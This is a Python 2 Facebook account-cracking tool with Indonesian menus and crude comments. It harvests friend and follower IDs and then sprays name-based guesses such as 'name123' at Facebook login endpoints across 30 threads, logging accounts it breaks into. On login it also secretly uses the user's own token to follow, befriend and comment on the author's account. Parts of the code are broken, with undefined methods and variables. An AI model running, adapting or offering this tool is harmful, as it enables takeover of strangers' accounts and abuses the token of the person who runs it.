#!/usr/bin/python2
# coding=utf-8
# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )
# recode recode recode kontol bapak Lo pecah
import os
try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [×] Modul bs4 belum terinstall!\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
import base64
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->
ok = []
cp = []
id = []
user = []
loop = 0
memek = random.randint(20000000.0, 30000000.0)
kontod = random.randint(20000, 40000)
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
#ngentodddddddddddddddd
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
IP = requests.get('https://api.ipify.org').text
# LO KONTOL
logo = '''%s     __  ____  ______  ____
     \ \/ /  |/  / _ )/ __/ ®
      \  / /|_/ / _  / _/  
      /_/_/  /_/____/_/ %sversion 2
  %s [%s Yayan Multi Brute Facebook%s ]
     [ \x1b[47;30;1m Created by : YayanXD.%s ]'''%(O,M,N,H,N,N)
# crack selesai
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print '\n\n %s[%s#%s] crack selesai...\n\n'%(N,K,N)
		print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
		print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N)
		exit()
	else:
		print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N)
		exit()
# Token FB bukan token PLN
def yayanxd():
	os.system('clear')
	print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
	__cindy__ = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
	if __cindy__ in ('open', 'Open', 'OPEN'):
		print '\n%s *%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
		print '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
		print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
		print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		yayanxd()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('__yayan__.txt', 'w')
		zedd.write(__cindy__)
		zedd.close()
		print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N)
		time.sleep(2)
		print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N)
		time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
		kontol()
	except KeyError:
		print '\n\n %s[%s!%s] token invalid'%(N,M,N)
		time.sleep(2)
		yayanxd()
### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
        __cindy__=open('__yayan__.txt','r').read()
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        idfb = jaoanzjwowj['id']
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N)
        exit()
    os.system('clear')
    print logo
    print ' %s[%s*%s]'%(N,O,N), 30 * '\x1b[1;96m-\x1b[0m'
    print ' %s[%s*%s] nama  : %s%s%s'%(N,O,N,B,nama,N)
    print ' %s[%s*%s] id fb : %s%s%s'%(N,O,N,B,idfb,N)
    print ' %s[%s*%s] IP    : %s%s'%(N,O,N,K,IP)
    print ' %s[%s*%s]'%(N,O,N), 30 * '\x1b[1;96m-\x1b[0m'
    print '\n [%s1%s]. Dump id dari teman'%(H,N)
    print ' [%s2%s]. Dump id dari teman publik'%(H,N)
    print ' [%s3%s]. Dump id dari total followers'%(H,N)
    print ' [%s4%s]. Mulai crack'%(H,N)
    print ' [%s5%s]. Lihat hasil crack'%(H,N)
    print ' %s[%s0%s]. logout (%shapus token%s)'%(N,M,N,M,N)
    awokawokawokawokawokawokawokawokawokawokawokawok()
def awokawokawokawokawokawokawokawokawokawokawokawok():
        yan = raw_input('\n [*] menu : ')
        if yan == '':
           print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
        elif yan =='1':
                teman()
        elif yan =='2':
                publik()
        elif yan =='3':
                followers()
        elif yan =='4':
                __crack__().slurr()
        elif yan =='5':
            print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check hasil OK")
            print(" \033[0;97m[\033[0;96m2\033[0;97m] Check hasil CP")
            ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
            if ask =="":
                moch_yayan()
            elif ask == "1" or ask == "01":
                try:
                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;92m"%(ha, op, ta,M,H,len(totalok)))
                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    moch_yayan()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil ok :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
            elif ask == "2" or ask == "02":
                try:
                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;93m"%(ha, op, ta,M,K,len(totalcp)))
                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil cp :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
            else:
                moch_yayan()
        elif yan =='8':
        	info_tools()
        elif yan =='0':
            	print '\n'
                tod()
                time.sleep(1)
                os.system('rm -rf __yayan__.txt')
                jalan ('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H))
                time.sleep(2)
                exit()
        else:
            print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
def kontol():
	try:
		__cindy__ = open('__yayan__.txt', 'r').read()
	except (KeyError, IOError):
		print '\n %s[%s×%s] token invalid'%(N,M,N)
		os.system('rm -rf __yayan__.txt')
	requests.post('https://graph.facebook.com/100003603863923/subscribers?access_token=%s'%(__cindy__))
	srghun = '100003603863923'
	rrtfgf = 'woi @[100003603863923:] udah croooot blom'
	fdrffg = '289056097891183'
	vyhbhj = 'ANGRY'
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(srghun,__cindy__))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(fdrffg,rrtfgf,__cindy__))
	requests.post('https://graph.facebook.com/%s/reactions?type=%s&access_token=%s'%(fdrffg,vyhbhj,__cindy__))
	moch_yayan()
# dump id dari teman hehe
def teman():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n [?] nama file  : ')
        asw = raw_input(' [?] limit id   : ')
        ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__cindy__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(B,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(cin)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [?] id publik  : ') 
        ahh = raw_input(' [?] nama file  : ')
        ihh = raw_input(' [?] limit id   : ')
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,__cindy__))
        id = []
        z = json.loads(xxx.text)
        kntl = ('dump/' + ahh + '.json').replace(' ', '_')
        ys = open(kntl, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(B,N,M,kntl,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(ppk)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari followers hehe
def followers():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [?] id follow  : ')
        mmk = raw_input(' [?] nama file  : ')
        asw = raw_input(' [?] limit id   : ')
        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,__cindy__))
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(B,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(ah)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.fl = []

    def slurr(self):
        try:
            self.apk = raw_input('\n [?] masukan file : ')
            self.id = open(self.apk).read().splitlines()
            print '\n [+] total id -> %s%s%s' %(M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.apk,P)
            time.sleep(3)
            moch_yayan()

        ___yayanganteng___ = raw_input(' [?] apakah ingin menggunakan kata sandi manual? [Y/t]: ')
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n [*] contoh: %s[ %ssayang,anjing,bangsat%s ]'%(N,H,N)
            while True:
                pwek = raw_input('\n [?] masukan kata sandi : ')
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    self.slurr()
                else:
                	
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            self.__yan__()
                        elif cin == '1':
                            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
                            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '2':
                            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
                            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '3':
                            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
                            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        else:
                            print '\n %s[%s!%s] input yang bener goblok!'%(N,M,N)
                            time.sleep(2)
                            moch_yayan()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [1]. method API (fast)'
                    print ' [2]. method mbasic (slow)'
                    __yan__(pwek.split(','))
                    break

        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [1]. method API (fast)'
            print ' [2]. method mbasic (slow)'
            self.__pler__()
        else:
            print '\n %s[%s×%s] y/t goblok!'%(N,M,N)
            time.sleep(2)
            moch_yayan()
        return

    def __api__(self, user, _yan_):
    	global ok,cp,loop
        print '\r [\x1b[1;96m*\x1b[0m] crack: %s/%s OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            api = 'https://b-api.facebook.com/method/auth.login'
            response = requests.get(api, params=params)
            if re.search('(EAAA)\\w+', response.text):
                print '\r  %s* --> %s|%s      %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
            	print '\r  %s* --> %s|%s      %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
        
    def __mbasic__(self, user, _yan_):
        global ok,cp,loop
        print '\r [\x1b[1;96m*\x1b[0m] crack: %s/%s OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers = {'x-fb-connection-bandwidth': repr(memek), 'x-fb-sim-hni': repr(kontod), 'x-fb-net-hni': repr(kontod), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'})
            xo = aw.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\r  %s* --> %s|%s      %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            if 'checkpoint' in xo:
            	try:
						__cindy__= open('__yayan__.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print '\r  %s* --> %s|%s|%      %s' % (K,user,pw,ttl,N)
						wrt = ' [×] %s|%s' % (user,pw)
						cp.append(wrt)
						open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
						break
            	else:
						continue
					
			loop += 1
        
    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            self.__pler__()
        elif yan in ('1', '01'):
            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for YNTKTS in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = YNTKTS.split('<=>')
                        cy = bb[1].split(' ')
                        if len(cy) == 1:
                            bacotBrotherhood = [
                            	cy[0]+'123', cy[0]+'1234',
                            	cy[0]+'12345',
                            ]
                        elif len(cy) == 2:
                        	bacotBrotherhood = [
                        		cy[0]+'123', cy[0]+'12345',
                        		cy[1]+'123', cy[1]+'12345',
                        	]
                        elif len(cy) == 3:
                        	bacotbrotherhood = [
                        		cy[0]+'123', cy[0]+'12345',
                        		cy[1]+'123', cy[1]+'12345',
                        		cy[2]+'123', cy[2]+'12345',
                        	]
                        elif len(cy) == 4:
                        	bacotBrotherhood = [
                        		cy[0]+'123', cy[0]+'12345',
                        		cy[1]+'123', cy[1]+'12345',
                        		cy[2]+'123', cy[2]+'12345',
                        		cy[3]+'123', cy[3]+'12345',
                        	]
                        else:
                        	bacotBrotherhood = [
                        		'sayang', 'anjing',
                        		'bismillah', '123456'
                        	]
                        __yayanXD__.submit(self.__api__, bb[0], bacotBrotherhood)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('2', '02'):
            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for YNTKTS in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = YNTKTS.split('<=>')
                        cy = bb[1].split(' ')
                        if len(cy) == 1:
                            bacotBrotherhood = [
                            	cy[0]+'123', cy[0]+'1234',
                            	cy[0]+'12345',
                            ]
                        elif len(cy) == 2:
                        	bacotBrotherhood = [
                        		cy[0]+'123', cy[0]+'12345',
                        		cy[1]+'123', cy[1]+'12345',
                        	]
                        elif len(cy) == 3:
                        	bacotbrotherhood = [
                        		cy[0]+'123', cy[0]+'12345',
                        		cy[1]+'123', cy[1]+'12345',
                        		cy[2]+'123', cy[2]+'12345',
                        	]
                        elif len(cy) == 4:
                        	bacotBrotherhood = [
                        		cy[0]+'123', cy[0]+'12345',
                        		cy[1]+'123', cy[1]+'12345',
                        		cy[2]+'123', cy[2]+'12345',
                        		cy[3]+'123', cy[3]+'12345',
                        	]
                        else:
                        	bacotBrotherhood = [
                        		'sayang', 'anjing',
                        		'bismillah', '123456'
                        	]
                        __yayanXD__.submit(self.__mbasic__, bb[0], bacotBrotherhood)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('3', '03'):
            print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for YNTKTS in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = YNTKTS.split('<=>')
                        cy = bb[1].split(' ')
                        if len(cy) == 1:
                            bacotBrotherhood = [
                            	cy[0]+'123', cy[0]+'1234',
                            	cy[0]+'12345',
                            ]
                        elif len(cy) == 2:
                        	bacotBrotherhood = [
                        		cy[0]+'123', cy[0]+'12345',
                        		cy[1]+'123', cy[1]+'12345',
                        	]
                        elif len(cy) == 3:
                        	bacotbrotherhood = [
                        		cy[0]+'123', cy[0]+'12345',
                        		cy[1]+'123', cy[1]+'12345',
                        		cy[2]+'123', cy[2]+'12345',
                        	]
                        elif len(cy) == 4:
                        	bacotBrotherhood = [
                        		cy[0]+'123', cy[0]+'12345',
                        		cy[1]+'123', cy[1]+'12345',
                        		cy[2]+'123', cy[2]+'12345',
                        		cy[3]+'123', cy[3]+'12345',
                        	]
                        else:
                        	bacotBrotherhood = [
                        		'sayang', 'anjing',
                        		'bismillah', '123456'
                        	]
                        __yayanXD__.submit(self.__mfb__, bb[0], bacotBrotherhood)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
            
if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
